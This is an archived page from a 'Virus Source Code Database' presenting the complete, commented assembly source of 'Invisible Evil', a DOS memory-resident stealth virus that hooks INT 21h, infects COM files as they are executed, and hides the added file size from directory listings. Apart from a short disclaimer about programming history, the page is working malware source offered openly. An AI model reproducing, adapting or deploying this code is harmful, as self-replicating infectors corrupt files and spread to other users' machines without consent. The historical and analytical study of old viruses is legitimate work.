<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: inv_evil_asm</title>
<meta name="KEYWORDS" content="inv_evil.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for inv_evil.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ice_asm.php">ice_asm</a><br>
<a href="iceburn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iceburn_asm.php">iceburn_asm</a><br>
<a href="icecream_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icecream_asm.php">icecream_asm</a><br>
<a href="icelandi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icelandi_asm.php">icelandi_asm</a><br>
<a href="icel_mix_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icel_mix_asm.php">icel_mix_asm</a><br>
<a href="icemelt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemelt_asm.php">icemelt_asm</a><br>
<a href="icemix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemix1_asm.php">icemix1_asm</a><br>
<a href="igor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/igor_asm.php">igor_asm</a><br>
<a href="ikv_528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv_528_asm.php">ikv_528_asm</a><br>
<a href="ikv528x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv528x_asm.php">ikv528x_asm</a><br>
<a href="imm-265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-265_asm.php">imm-265_asm</a><br>
<a href="imm-353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-353_asm.php">imm-353_asm</a><br>
<a href="imm-377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-377_asm.php">imm-377_asm</a><br>
<a href="imm-510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-510_asm.php">imm-510_asm</a><br>
<a href="imm-550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-550_asm.php">imm-550_asm</a><br>
<a href="immor265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor265_asm.php">immor265_asm</a><br>
<a href="immor353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor353_asm.php">immor353_asm</a><br>
<a href="immor377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor377_asm.php">immor377_asm</a><br>
<a href="immor510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor510_asm.php">immor510_asm</a><br>
<a href="immor550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor550_asm.php">immor550_asm</a><br>
<a href="incdaddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incdaddy_asm.php">incdaddy_asm</a><br>
<a href="incmummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incmummy_asm.php">incmummy_asm</a><br>
<a href="incsistr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incsistr_asm.php">incsistr_asm</a><br>
<a href="incubus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus1_asm.php">incubus1_asm</a><br>
<a href="incubus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus_asm.php">incubus_asm</a><br>
<a href="indit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/indit_asm.php">indit_asm</a><br>
<a href="infecta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infecta_asm.php">infecta_asm</a><br>
<a href="infect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infect_asm.php">infect_asm</a><br>
<a href="infectb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infectb_asm.php">infectb_asm</a><br>
<a href="inferdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inferdem_asm.php">inferdem_asm</a><br>
<a href="insert_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insert_asm.php">insert_asm</a><br>
<a href="ins_real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins_real_asm.php">ins_real_asm</a><br>
<a href="ins-real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins-real_asm.php">ins-real_asm</a><br>
<a href="insuff_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insuff_asm.php">insuff_asm</a><br>
<a href="int_13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int_13_asm.php">int_13_asm</a><br>
<a href="int-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int-13_asm.php">int-13_asm</a><br>
<a href="int13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13__asm.php">int13__asm</a><br>
<a href="int13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13_asm.php">int13_asm</a><br>
<a href="intr1440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1440_asm.php">intr1440_asm</a><br>
<a href="intr1988_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1988_asm.php">intr1988_asm</a><br>
<a href="intrude__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intrude__asm.php">intrude__asm</a><br>
<a href="intruder_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intruder_asm.php">intruder_asm</a><br>
<a href="inv_danu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_danu_asm.php">inv_danu_asm</a><br>
<a href="invdanub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invdanub_asm.php">invdanub_asm</a><br>
<a href="inv_evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_evil_asm.php">inv_evil_asm</a><br>
<a href="inv-evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv-evil_asm.php">inv-evil_asm</a><br>
<a href="invol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invol_asm.php">invol_asm</a><br>
<a href="iod_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iod_asm.php">iod_asm</a><br>
<a href="ir144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ir144_asm.php">ir144_asm</a><br>
<a href="irm_kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/irm_kill_asm.php">irm_kill_asm</a><br>
<a href="israel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/israel_asm.php">israel_asm</a><br>
<a href="it_457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_457_asm.php">it_457_asm</a><br>
<a href="it-457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it-457_asm.php">it-457_asm</a><br>
<a href="ital_boy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ital_boy_asm.php">ital_boy_asm</a><br>
<a href="italian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italian_asm.php">italian_asm</a><br>
<a href="italiano_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italiano_asm.php">italiano_asm</a><br>
<a href="it_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_asm.php">it_asm</a><br>
<a href="it_pest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_pest_asm.php">it_pest_asm</a><br>
<a href="itti_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_a_asm.php">itti_a_asm</a><br>
<a href="itti-a___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a___asm.php">itti-a___asm</a><br>
<a href="itti-a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a__asm.php">itti-a__asm</a><br>
<a href="itti-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a_asm.php">itti-a_asm</a><br>
<a href="itti_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_b_asm.php">itti_b_asm</a><br>
<a href="itti-b___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b___asm.php">itti-b___asm</a><br>
<a href="itti-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b__asm.php">itti-b__asm</a><br>
<a href="itti-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b_asm.php">itti-b_asm</a><br>
<a href="itty_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_a_asm.php">itty_a_asm</a><br>
<a href="itty-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-a_asm.php">itty-a_asm</a><br>
<a href="itty_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_b_asm.php">itty_b_asm</a><br>
<a href="itty-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-b_asm.php">itty-b_asm</a><br>
<a href="itwisted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwisted_asm.php">itwisted_asm</a><br>
<a href="itwistu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwistu_asm.php">itwistu_asm</a><br>
<a href="ivpbecky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbecky_asm.php">ivpbecky_asm</a><br>
<a href="ivpbubb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubb2_asm.php">ivpbubb2_asm</a><br>
<a href="ivpbubbl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubbl_asm.php">ivpbubbl_asm</a><br>
<a href="ivp-dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dan_asm.php">ivp-dan_asm</a><br>
<a href="ivp-darl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-darl_asm.php">ivp-darl_asm</a><br>
<a href="ivp-dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dj_asm.php">ivp-dj_asm</a><br>
<a href="ivpmorbd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpmorbd_asm.php">ivpmorbd_asm</a><br>
<a href="ivpputer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpputer_asm.php">ivpputer_asm</a><br>
<a href="ivp-rose_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-rose_asm.php">ivp-rose_asm</a><br>
<a href="ivpshock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpshock_asm.php">ivpshock_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Virusname  : Invisible Evil
; Virusauthor: Metal Militia
; Virusgroup : Immortal Riot
; Origin     : Sweden
;
; It's a memory resident, stealth, infector of com files. 
; It check for two nops a bit after the jmp to see if it's already
; infected or not, and to stealth it, it'll check the seconds.
; No destructive routine included in this version, perhaps to come(?)
; Um!.. well, enjoy Insane Reality issue #4!
; I think that's all for now, outa here..
;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;			  INVISIBLE EVIL!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

virus           segment
                assume  cs:virus,ds:virus,es:nothing
              
        org     100h
start:  db      0E9h,02,00,90h,90h ; Jmp to vstart

vstart  equ     $                
        call    code_start      ; call codie_startie
code_start:          
        pop     si
        sub     si,offset code_start ; so we can use the lea command etc
        jmp     code_continue

        db      ' Our past is ' ; Lil' poem (?)
        db      ' our future! ' ; of mine

code_continue:
        mov     bp,si           ; Now, put bp in si instead so bp's used
        jmp     load            ; Jmp and go resident

old_21  dd      ?               ; Old int21 interrupt saved here

new_21:                         ; Our own, new one int21
        cmp     ax,4b00h        ; Is a file being executed
        je      exec1           ; If so, damn it! INFECT!
        
dir_thang:
        cmp     ah,11h          ; Find first
        je      hide_size       ; Use stealth
        cmp     ah,12h          ; Find next
        je      hide_size       ; Use stealth
        cmp     ax,3030h        ; Another copy trying to go resident?
        jne     do_old          ; If not, do the old int21 thang
        mov     bx,3030h        ; Show that we're already resident
do_old: jmp     dword ptr cs:[(old_21-vstart)]  ; Jmp old int21
exec1:  jmp     exec                            ; Try to infect
do_dir: jmp     dword ptr cs:[(old_21-vstart)]  ; See do_old
        ret                                     ; But return back

hide_size:
        pushf
        push    cs
        call    do_dir                          ; get FCB (current)
        cmp     al,00h                          ; Is DIR being used (?)
        jz      undocumented_get_FCB            ; If so, go on
        jmp     dir_error                       ; If not, get the fuck
                                                ; outa this place man
undocumented_get_FCB:
        push    ax                              ; push
        push    bx                              ; push
        push    es                              ; push (gaak! no pops)
        mov     ah,51h                          ; get FCB (location)
        int     21h                             ; figure it out
        mov     es,bx                           ; get FCB (info)
        cmp     bx,es:[16h]                     ; check it
        je      fix_it_up                       ; if so, move on
        jmp     not_inf

fix_it_up:
        mov     bx,dx                           ; fixup
        mov     al,[bx]                         ; some
        push    ax                              ; shit
        mov     ah,2fh                          ; get the DTA
        int     21h                             ; yeah, you do that
        pop     ax                              ; atlast, pop me babe
        inc     al                              ; check FCB (extended)
        jz      add_it                          ; ok, move on
        jmp     normal_fcb                      ; jmp normal_fcb

add_it:
        add     bx,7h                           ; yes, add it.. go ahead
normal_fcb:
        mov     ax,es:[bx+17h]
        and     ax,1fh
        xor     al,01h                          ; are the file's seconds
        jz      go_on_and_do_it_strong          ; equal to "2"?
        jmp     not_inf                         ; If so, outa here
        
go_on_and_do_it_strong:
        and     byte ptr es:[bx+17h],0e0h       ; subtract the size
        sub     es:[bx+1dh],(vend-vstart)       ; how much? (*.*)
        sbb     es:[bx+1fh],ax                  ; yet another stealthed
not_inf:pop     es                              ; we will..
        pop     bx                              ; we will..
        pop     ax                              ; pop you! pop you!
        
dir_error:   
        iret                                    ; return to the one who
                                                ; called this thang
exec:   
        push    ax                              ; push the stuff needed
        push    bx                              ; (as normally)
        push    cx
        push    dx
        push    di
        push    si
        push    ds
        push    es

infect: 
        mov     ax,3d02h                        ; Open the file being
        int     21h                             ; executed do that!
        jc      fuckitall                       ; If error, get the fuck
                                                ; out!
        
        xchg    ax,bx                           ; or.. mov bx,ax
                
        push    ds                              ; pusha
        push    cs                              ; push
        pop     ds                              ; pop!

        mov     ah,3fh                          ; Read from file
        mov     dx,(buffer-vstart)              ; put in our buffer
        mov     cx,5h                           ; how much to read
        int     21h                             ; do that
        jc      fuckitall                       ; If error, fuck it!
        

        cmp     word ptr cs:[(buffer-vstart)],5A4Dh ; Is it an .EXE?
        je      fuckitall                           ; If so, outa here..

        cmp     word ptr cs:[(buffer-vstart)],4D5Ah ; The other form?
        je      fuckitall                           ; (can be MZ or ZM)
                                                    ; If so, outa here
        cmp     word ptr cs:[(buffer-vstart)+3],9090h ; Ok, is it
        je      fuckitall                           ; infect? If so,
                                                    ; outa here
        jmp     next                                ; Move on..

fuckitall:
        jmp     homey2                              ; Something screwed,
                                                    ; outa dis thang..
next:   

        mov     ax,5700h                            ; Get date/time
        int     21h                                 ; int me baaaabe!

        mov     word ptr cs:[(old_time-vstart)],cx  ; save time
        mov     word ptr cs:[(old_date-vstart)],dx  ; save date
 
        mov     ax,4202h                            ; ftpr to end
        mov     cx,0                                ; get ftpr (filesize)
        cwd                                         ; or.. xor dx,dx
        int     21h
        jc      fuckitall                           ; if error, fuck it!
        mov     cx,ax                               ; mov cx to ax
        sub     cx,3                                ; for the jmp
        jmp     save_rest_of_len
        db      ' [INVISIBLE EVIL!] (c) Metal Militia/Immortal Riot '

save_rest_of_len:
        mov     word ptr cs:[(jump_add+1-vstart)],cx ; save jmp length

        mov     ah,40h                              ; write to file
        mov     cx,(vend-vstart)                    ; the virus
        cwd                                         ; from start
        int     21h                                 ; atlast the fun part
        jnc     fpointer                            ; no error(s), go on
        jc      homey                               ; fuck it!

fpointer:
        mov     ax,4200h                            ; move file pointer
        mov     cx,0                                ; to the beginning
        cwd
        int     21h


        mov     ah,40h                              ; write the JMP the
        mov     cx, 5                               ; the file (5 bytes)
        mov     dx,(jump_add-vstart)                ; offset jump thang
        int     21h
        
        jc      homey                               ; if error, fuck it!

        mov     ax,5701h                            ; restore old
        mov     word ptr cx,cs:[(old_time-vstart)]  ; date/time
        mov     word ptr dx,cs:[(old_date-vstart)]
        
        and     cl,0e0H                             ; chance the file's
        inc     cl                                  ; seconds to "2" for
        int     21h                                 ; stealth "marker"
        

        mov     ah,3eh                              ; close thisone
        int     21h


homey: jmp     homey2                               ; outa here
       db      ' Dedicated to all the victims.. '   ; dedication note

homey2: pop     ds                                  ; pop
        pop     es                                  ; pop
        pop     ds                                  ; pop
        pop     si                                  ; pop
        pop     di                                  ; pop
        pop     dx                                  ; pop
        pop     cx                                  ; pop
        pop     bx                                  ; pop
        pop     ax                                  ; new virus-name
                                                    ; popcorn virus?
        jmp    dword ptr cs:[(old_21-vstart)]       ; heading for old
                                                    ; int21
old_date dw     0                                   ; date/time
old_time dw     0                                   ; saving place


buffer: db      0cdh,20h,00                         ; our lil' buffer
buffer2 db      0,0                                 ; plus these two
jump_add: db    0E9h,00,00,90h,90h;                 ; what we put instead
                                                    ; of org. jmp
exit2:  jmp     exit                                ; get outa here

load:   mov     ax,3030h                            ; Are we already in
        int     21h                                 ; this users memory
        cmp     bx,3030h                            ; well, check it!
        je      exit2                               ; if so, outa here
        

dec_here:
        push    cs                              ; push
        pop     ds                              ; pop

        mov     ah,4ah                          ; req. very much mem
        mov     bx,0ffffh                       ; ret's largest size
        int     21h

        mov     ah,4ah                          ; ok, so now we
        sub     bx,(vend-vstart+15)/16+1        ; subtract the size of
        jnc     intme                           ; of our virus. If no
        jmp     exit2                           ; error go on, else
                                                ; fuck it
intme:
        int     21h                             ; int me! int me!

        mov     ah,48h
        mov     bx,(vend-vstart+15)/16          ; req. last pages
        int     21h                             ; allocate to the virus
        jnc     decme                           ; no error, go on
        jmp     exit2                           ; les get outa dis place
        
decme:
        dec     ax                              ; oh? a dec, no push/pop
                                                ; how glad i am :)
        push    es                              ; blurk! yet another push
        
        mov     es,ax                           ; set es to ax
        jmp     dos_own                         ; carry on comrade
        db      ' Greets to B-real!/IR '        ; greetings to our
                                                ; latest member, a
dos_own:                                        ; friend of mine
        mov     byte ptr es:[0],'Z'             ; this memory will
        mov     word ptr es:[1],8               ; have DOS as it's
                                                ; owner
        inc     ax                              ; opposite of dec, eh?
                                                ; yet another new-commer
        lea     si,[bp+offset vstart]           ; copy to memory
        mov     di,0                            ; (new block) xor di,di
        jmp     copy_rest                       ; go on
        db      ' It''s like this and like that and like thisena ' ; lil'

copy_rest:
        mov     es,ax                           ; es as ax
        mov     cx,(vend-vstart+5)/2            ; the whole thing
        cld                                     ; bytes, clr direction
        rep     movsw
        jmp     make_res                        ; now, make it resident
        db      ' It''s like that and like this and like thatena '; thang
        
make_res:
        xor     ax,ax                           ; atlast!
        mov     ds,ax                           ; put all shit to memory
        push    ds                              ; don't push me around :)
        lds     ax,ds:[21h*4]                   ; vectorswapping
        jmp     swap_sect                       ; (manually!)
        db      ' It''s like this.. '           ; by Snoop 'n Dre.

swap_sect:
        mov     word ptr es:[old_21-vstart],ax   ; where's our old int21
        mov     word ptr es:[old_21-vstart+2],ds ; stored? well see here
        pop     ds
        mov     word ptr ds:[21h*4],(new_21-vstart) ; point to our virus
        mov     ds:[21h*4+2],es                     ; instead of old21

        push    cs                                  ; no cmt.
        pop     ds                                  ; to much 'bout 'em
                                                    ; today, eh? :)

exit:
        push    cs                                  ; no cmt.
        pop     es                                  ; see above

        mov     cx,5                                ; five bytes
        jmp     copyback                            ; keep on moving..
        db      ' Love to Lisa! '                   ; To the girl i love
copyback:
        mov     si,offset buffer                ; copy back org. jmp
        add     si,bp                           ; and run the org. proggy
        jmp     movdi_it                        ; yeah, les do that
        db      ' All i ever wanted.. '         ; Lisa, the one and only

movdi_it:
        mov     di,100h                         ; di = 100h
        repne   movsb
        jmp     lastshit                        ; atlast, soon the end
        db      ' All i ever asked for.. '      ; Love in eternality!

lastshit:
        mov     bp,100h                         ; bp equ 100h
        jmp     bp                              ; jmp to bp (SOF)


vend    equ     $                               ; end of virus

virus        ends
        end     start

</textarea></td></tr></table></body></html>
